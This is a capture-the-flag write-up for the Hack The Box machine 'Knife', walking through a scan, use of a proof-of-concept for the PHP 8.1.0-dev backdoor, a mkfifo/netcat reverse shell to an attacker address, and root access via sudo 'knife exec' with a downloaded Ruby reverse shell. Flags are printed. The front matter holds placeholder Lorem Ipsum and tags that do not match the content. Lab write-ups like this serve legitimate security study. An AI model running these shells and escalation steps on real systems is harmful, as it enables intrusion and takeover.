---
layout: single
title: Knife - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2021-05-25
classes: wide
header:
  teaser: /assets/images/htb-writeup-knife/knife_logo.png
  teaser_home_page: true
  icon: /assets/images/htb.png
categories:
  - hackthebox
  - infosec
tags:  
  - osticket
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-knife/knife_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------


   ██╗   ██╗███████╗███████╗██████╗
   ██║   ██║██╔════╝██╔════╝██╔══██╗
   ██║   ██║███████╗█████╗  ██████╔╝
   ██║   ██║╚════██║██╔══╝  ██╔══██╗
   ╚██████╔╝███████║███████╗██║  ██║
    ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝


1. [root:/git/htb/knife]# nmap -Pn -n --open -sCV 10.10.10.242                                                                       (master✱)
  Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
  Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-24 10:51 CEST
  Nmap scan report for 10.10.10.242
  Host is up (0.044s latency).
  Not shown: 998 closed ports
  PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey:
  |   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
  |   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
  |_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
  80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
  |_http-server-header: Apache/2.4.41 (Ubuntu)
  |_http-title:  Emergent Medical Idea
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

DIRB:
  -

NIKTO:
  + Retrieved x-powered-by header: PHP/8.1.0-dev


2. By looking at the website there's not much we can do. No links, no nothing really.
   Going back the the enum data it's sparse, but from Nikto we find PHP version 8.1.0-dev - which sounds interesting.

   Googling around I came across an article mentioning 8.1.0-dev was released with a backdoor, making all sites using it vulnerable.
   Download a PoC script and run it to get a shell, and grab user.txt.


   [root:/git/htb/knife]# python3 backdoor_php8.1.0-dev.py                                                                           (master✱)
     Enter the full host url:
     http://10.10.10.242

     Interactive shell is opened on http://10.10.10.242
     Can't access tty; job crontol turned off.
     $ hostname && id
      knife
      uid=1000(james) gid=1000(james) groups=1000(james)

    $ cat /home/james/user.txt
      49e822672ec0b1f552fd10c37f815904


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██████╗  ██████╗  ██████╗ ████████╗
   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
   ██████╔╝██║   ██║██║   ██║   ██║
   ██╔══██╗██║   ██║██║   ██║   ██║
   ██║  ██║╚██████╔╝╚██████╔╝   ██║
   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝


1. The PoC-shell is limited so start by sending a new reverse shell;

  $ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.6 4488 >/tmp/f

  [root:/git/htb/knife]# nc -lvnp 4488                                                                                              (master✱)
    listening on [any] 4488 ...
    connect to [10.10.14.6] from (UNKNOWN) [10.10.10.242] 59996
    /bin/sh: 0: can't access tty; job control turned off
    $

Upgrade the shell.


2. As usual, start with 'sudo -l'.

  james@knife:/$ sudo -l
    Matching Defaults entries for james on knife:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

    User james may run the following commands on knife:
        (root) NOPASSWD: /usr/bin/knife


Running the command we get a lot of help output, including an interesting exec option.
  james@knife:/$ sudo /usr/bin/knife
    ..
    ** EXEC COMMANDS **
    knife exec [SCRIPT] (options)

Looking at the knife binary we see that it's ruby - so most likely a ruby script is the way to go here.


3. Upload a ruby reverse shell and execute it. Capture the shell and grab root.txt.

  james@knife:/dev/shm$ wget http://10.10.14.6/rev.rb
  james@knife:/dev/shm$ chmod +x rev.rb
  james@knife:/dev/shm$ sudo /usr/bin/knife exec /dev/shm/rev.rb

  [root:/git/htb/knife]# nc -lvnp 4499                                                                                              (master✱)
    listening on [any] 4499 ...
    connect to [10.10.14.6] from (UNKNOWN) [10.10.10.242] 44298
    We are connected!
    root@knife:/dev/shm# id && hostname && cat /root/root.txt
      uid=0(root) gid=0(root) groups=0(root)
      knife
      8a3f41cb35cd8ca41e684e209e051a6c


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██╗███╗   ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
   ██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║
   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
   ██║██║ ╚████║██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
   ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝


PHP 8.1.0-dev backdoor:
  https://github.com/flast101/php-8.1.0-dev-backdoor-rce
